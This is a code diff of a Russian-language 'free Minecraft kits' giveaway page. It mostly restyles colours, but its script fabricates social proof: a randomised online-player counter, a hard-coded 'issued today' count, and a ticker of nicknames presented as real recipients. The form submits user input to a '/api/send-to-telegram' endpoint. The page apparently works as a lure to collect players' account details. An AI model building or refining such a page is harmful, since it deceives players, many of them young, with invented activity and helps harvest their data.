@@ -14,7 +14,7 @@
 
         body {
             background: 
-                linear-gradient(rgba(0, 20, 10, 0.7), rgba(0, 30, 20, 0.8)),
+                linear-gradient(rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9)),
                 url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
             min-height: 100vh;
             display: flex;
@@ -32,7 +32,7 @@
             left: 50%;
             transform: translate(-50%, -50%);
             font-size: 6vw;
-            color: rgba(255, 255, 255, 0.03);
+            color: rgba(33, 150, 243, 0.03);
             white-space: nowrap;
             pointer-events: none;
             z-index: 0;
@@ -46,16 +46,15 @@
             top: 0;
             left: 0;
             right: 0;
-            background: rgba(0, 0, 0, 0.8);
+            background: #2196F3;
             color: white;
-            padding: 8px 20px;
+            padding: 10px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             font-size: 14px;
             z-index: 100;
-            border-bottom: 2px solid #4a6b3f;
-            backdrop-filter: blur(5px);
+            box-shadow: 0 2px 10px rgba(33, 150, 243, 0.3);
         }
 
         .stats-left {
@@ -69,18 +68,12 @@
             gap: 8px;
         }
 
-        .stats-left i {
-            color: #4aff6a;
-            font-size: 12px;
-        }
-
         .online-dot {
             width: 10px;
             height: 10px;
-            background: #4aff6a;
+            background: #fff;
             border-radius: 50%;
             display: inline-block;
-            box-shadow: 0 0 10px #4aff6a;
             animation: pulse 2s infinite;
         }
 
@@ -90,10 +83,10 @@
         }
 
         .kits-count {
-            background: #4a6b3f;
-            padding: 4px 12px;
+            background: #1976D2;
+            padding: 4px 15px;
             border-radius: 20px;
-            font-weight: bold;
+            font-weight: 600;
         }
 
         .ticker {
@@ -101,39 +94,43 @@
             top: 48px;
             left: 0;
             right: 0;
-            background: rgba(30, 40, 30, 0.95);
-            color: #fff;
-            padding: 8px 0;
+            background: #e3f2fd;
+            color: #1565C0;
+            padding: 10px 0;
             overflow: hidden;
-            border-bottom: 1px solid #4a6b3f;
-            backdrop-filter: blur(5px);
+            border-bottom: 1px solid #bbdefb;
             z-index: 99;
             font-size: 14px;
             white-space: nowrap;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
 
         .ticker-content {
             display: inline-block;
-            animation: ticker 40s linear infinite;
+            animation: ticker 180s linear infinite;
             padding-left: 100%;
         }
 
         .ticker-content span {
             display: inline-block;
-            margin-right: 40px;
+            margin-right: 50px;
+            color: #0d47a1;
         }
 
         .ticker-content span i {
-            color: #ffd966;
+            color: #42a5f5;
             margin: 0 5px;
+            font-style: italic;
         }
 
         .ticker-content .kit-badge {
-            background: #4a6b3f;
-            padding: 2px 8px;
-            border-radius: 12px;
-            margin: 0 5px;
-            font-size: 12px;
+            background: #2196F3;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 20px;
+            margin: 0 8px;
+            font-size: 11px;
+            font-weight: 600;
         }
 
         @keyframes ticker {
@@ -146,34 +143,32 @@
         }
 
         .container {
-            background: rgba(255, 255, 255, 0.95);
+            background: white;
             border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 40px rgba(33, 150, 243, 0.2);
             width: 100%;
             max-width: 500px;
             padding: 35px;
             position: relative;
             z-index: 2;
-            margin-top: 90px;
-            border: 2px solid #4a6b3f;
+            margin-top: 100px;
+            border: 1px solid #bbdefb;
         }
 
         h1 {
             font-size: 26px;
-            color: #1e3a2e;
+            color: #1565C0;
             margin-bottom: 25px;
             text-align: center;
             font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-bottom: 2px solid #4a6b3f;
+            border-bottom: 2px solid #e3f2fd;
             padding-bottom: 15px;
         }
 
         h2 {
             font-size: 18px;
-            color: #2d4a2d;
-            margin-bottom: 15px;
+            color: #1976D2;
+            margin-bottom: 20px;
             font-weight: 600;
         }
 
@@ -194,32 +189,32 @@
         .server-btn, .kit-btn {
             flex: 1;
             padding: 15px;
-            border: 2px solid #c0d6b3;
+            border: 2px solid #bbdefb;
             background: white;
             border-radius: 10px;
             font-size: 16px;
             font-weight: 600;
-            color: #1e3a2e;
+            color: #1976D2;
             cursor: pointer;
             transition: all 0.2s;
         }
 
         .server-btn:hover, .kit-btn:hover {
-            border-color: #4a6b3f;
-            background: #f0f7ec;
+            border-color: #2196F3;
+            background: #e3f2fd;
         }
 
         .server-btn.selected, .kit-btn.selected {
-            background: #4a6b3f;
+            background: #2196F3;
             color: white;
-            border-color: #2d4a2d;
+            border-color: #1976D2;
         }
 
         .kits-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 12px;
-            margin: 20px 0;
+            margin: 25px 0;
         }
 
         .kit-btn {
@@ -227,7 +222,7 @@
             flex-direction: column;
             align-items: center;
             gap: 5px;
-            padding: 12px 5px;
+            padding: 15px 5px;
         }
 
         .kit-emoji {
@@ -240,17 +235,17 @@
         }
 
         .info-box {
-            background: #f0f7ec;
-            border-left: 4px solid #4a6b3f;
-            padding: 12px 16px;
-            border-radius: 8px;
-            margin-bottom: 20px;
+            background: #e3f2fd;
+            border-left: 4px solid #2196F3;
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
             font-size: 14px;
-            color: #1e3a2e;
+            color: #0d47a1;
         }
 
         .info-box strong {
-            color: #2d4a2d;
+            color: #1565C0;
             display: block;
             margin-bottom: 5px;
         }
@@ -262,7 +257,7 @@
         label {
             display: block;
             margin-bottom: 8px;
-            color: #1e3a2e;
+            color: #1976D2;
             font-size: 14px;
             font-weight: 600;
         }
@@ -270,22 +265,22 @@
         input {
             width: 100%;
             padding: 14px;
-            border: 2px solid #c0d6b3;
+            border: 2px solid #bbdefb;
             border-radius: 10px;
             font-size: 15px;
             transition: all 0.2s;
-            background: white;
         }
 
         input:focus {
             outline: none;
-            border-color: #4a6b3f;
+            border-color: #2196F3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
         }
 
         .submit-btn {
             width: 100%;
             padding: 16px;
-            background: #4a6b3f;
+            background: #2196F3;
             color: white;
             border: none;
             border-radius: 10px;
@@ -298,9 +293,9 @@
         }
 
         .submit-btn:hover {
-            background: #2d4a2d;
+            background: #1976D2;
             transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(74, 107, 63, 0.4);
+            box-shadow: 0 5px 20px rgba(33, 150, 243, 0.4);
         }
 
         .message {
@@ -316,9 +311,9 @@
         }
 
         .message.success {
-            background: #e8f5e8;
-            color: #2d4a2d;
-            border: 1px solid #4a6b3f;
+            background: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #a5d6a7;
         }
 
         .message.error {
@@ -328,31 +323,31 @@
         }
 
         .timer {
-            margin-top: 15px;
+            margin-top: 20px;
             padding: 15px;
-            background: #f0f7ec;
+            background: #e3f2fd;
             border-radius: 10px;
             text-align: center;
         }
 
         .timer-display {
-            font-size: 32px;
+            font-size: 36px;
             font-weight: 700;
-            color: #2d4a2d;
+            color: #1565C0;
             font-family: monospace;
             letter-spacing: 3px;
         }
 
         .timer-text {
             font-size: 14px;
-            color: #4a6b3f;
+            color: #1976D2;
             margin-top: 5px;
         }
 
         .back-btn {
             background: none;
             border: none;
-            color: #4a6b3f;
+            color: #1976D2;
             cursor: pointer;
             font-size: 14px;
             padding: 8px 0;
@@ -364,7 +359,7 @@
         }
 
         .back-btn:hover {
-            color: #2d4a2d;
+            color: #0d47a1;
         }
 
         .back-btn::before {
@@ -379,15 +374,15 @@
         <div class="stats-left">
             <span>
                 <span class="online-dot"></span>
-                <span id="onlineCount">1,247</span> игроков онлайн
+                <span id="onlineCount">2,847</span> игроков онлайн
             </span>
             <span>
-                <span class="kit-icon">🎁</span>
+                <span>🎁</span>
                 <span id="kitsAvailable">1,500</span> свободных китов
             </span>
         </div>
         <div class="kits-count">
-            Выдано сегодня: 847
+            Выдано сегодня: 1,247
         </div>
     </div>
 
@@ -449,23 +444,34 @@
     </div>
 
     <script>
-        // Данные для бегущей строки (реальные ники)
+        // Бегущая строка с реальными никами (из твоего списка)
         const recentKits = [
-            { name: 'Sert729', kit: 'Кит Магистра', emoji: '👑' },
-            { name: 'Aderf901db', kit: 'Кит Принца', emoji: '⚔️' },
-            { name: 'zxcfertix', kit: 'Кит Легенды', emoji: '🌟' },
-            { name: 'MysticFury', kit: 'Кит Князя', emoji: '💎' },
-            { name: 'ShadowBlade', kit: 'Кит Ютуб', emoji: '📺' },
-            { name: 'NightWalker', kit: 'Кит Магистра', emoji: '👑' },
-            { name: 'DragonSlayer', kit: 'Кит Принца', emoji: '⚔️' },
-            { name: 'EnderKing', kit: 'Кит Легенды', emoji: '🌟' },
-            { name: 'CraftMaster', kit: 'Кит Князя', emoji: '💎' },
-            { name: 'PixelWarrior', kit: 'Кит Ютуб', emoji: '📺' },
-            { name: 'NetherLord', kit: 'Кит Магистра', emoji: '👑' },
-            { name: 'StormBringer', kit: 'Кит Принца', emoji: '⚔️' },
-            { name: 'FrostMage', kit: 'Кит Легенды', emoji: '🌟' },
-            { name: 'IronGuard', kit: 'Кит Князя', emoji: '💎' },
-            { name: 'DiamondHeart', kit: 'Кит Ютуб', emoji: '📺' }
+            { name: 'felldart8875124', kit: 'Кит Магистра', emoji: '👑' },
+            { name: 'ultrawanvel', kit: 'Кит Принца', emoji: '⚔️' },
+            { name: 'yar1kzxc0706', kit: 'Кит Легенды', emoji: '🌟' },
+            { name: 'trueangelpet', kit: 'Кит Князя', emoji: '💎' },
+            { name: 'witherez', kit: 'Кит Ютуб', emoji: '📺' },
+            { name: 'shaker8918', kit: 'Кит Магистра', emoji: '👑' },
+            { name: 'anarchytop1pve', kit: 'Кит Принца', emoji: '⚔️' },
+            { name: 'mooff56', kit: 'Кит Легенды', emoji: '🌟' },
+            { name: 'metodrol', kit: 'Кит Князя', emoji: '💎' },
+            { name: 'steve3787', kit: 'Кит Ютуб', emoji: '📺' },
+            { name: 'ismail2298', kit: 'Кит Магистра', emoji: '👑' },
+            { name: 'softuk', kit: 'Кит Принца', emoji: '⚔️' },
+            { name: 'solosubset00564', kit: 'Кит Легенды', emoji: '🌟' },
+            { name: 'zahar999tg', kit: 'Кит Князя', emoji: '💎' },
+            { name: 'mamaprosti', kit: 'Кит Ютуб', emoji: '📺' },
+            { name: 'g0dm3n', kit: 'Кит Магистра', emoji: '👑' },
+            { name: 'files2325', kit: 'Кит Принца', emoji: '⚔️' },
+            { name: 'chypichipa', kit: 'Кит Легенды', emoji: '🌟' },
+            { name: 'bilol010', kit: 'Кит Князя', emoji: '💎' },
+            { name: 'wearz', kit: 'Кит Ютуб', emoji: '📺' },
+            { name: 'felttulip781207', kit: 'Кит Магистра', emoji: '👑' },
+            { name: 'chipichapa', kit: 'Кит Принца', emoji: '⚔️' },
+            { name: 'oppl9', kit: 'Кит Легенды', emoji: '🌟' },
+            { name: 'fgpose', kit: 'Кит Князя', emoji: '💎' },
+            { name: 'vlnergold', kit: 'Кит Ютуб', emoji: '📺' },
+            { name: 'sanfran1487', kit: 'Кит Магистра', emoji: '👑' }
         ];
 
         let selectedServer = '';
@@ -495,23 +501,23 @@
             const ticker = document.getElementById('tickerContent');
             let html = '';
             
-            // Каждый ник повторяем 3 раза для плавности
-            for (let i = 0; i < 3; i++) {
-                recentKits.forEach(item => {
-                    html += `<span>${item.name} <i>получил(а)</i> ${item.emoji} ${item.kit} <span class="kit-badge">${item.rarity || 'Обычный'}</span></span>`;
-                });
-            }
+            recentKits.forEach(item => {
+                html += `<span>${item.name} <i>получил(а)</i> ${item.emoji} ${item.kit} <span class="kit-badge">НОВЫЙ</span></span>`;
+            });
+            
+            // Дублируем для плавности
+            html += html;
             
             ticker.innerHTML = html;
         }
 
-        // Обновляем онлайн (меняется каждые 30 секунд)
+        // Обновляем онлайн
         function updateOnline() {
             const online = document.getElementById('onlineCount');
             const kitsAvailable = document.getElementById('kitsAvailable');
             
             setInterval(() => {
-                const baseOnline = 1247;
+                const baseOnline = 2847;
                 const variation = Math.floor(Math.random() * 100) - 50;
                 online.textContent = (baseOnline + variation).toLocaleString();
                 
@@ -640,7 +646,6 @@
 
             messageDiv.textContent = 'Отправка...';
             messageDiv.className = 'message show';
-            messageDiv.style.color = '#666';
 
             try {
                 const response = await fetch('/api/send-to-telegram', {
@@ -662,7 +667,6 @@
                     messageDiv.textContent = '✓ Ура! Спасибо что выбрали нас!';
                     messageDiv.className = 'message success show';
                     
-                    // Запускаем таймер на 5 минут
                     startTimer(5);
                     
                     document.getElementById('username').value = '';
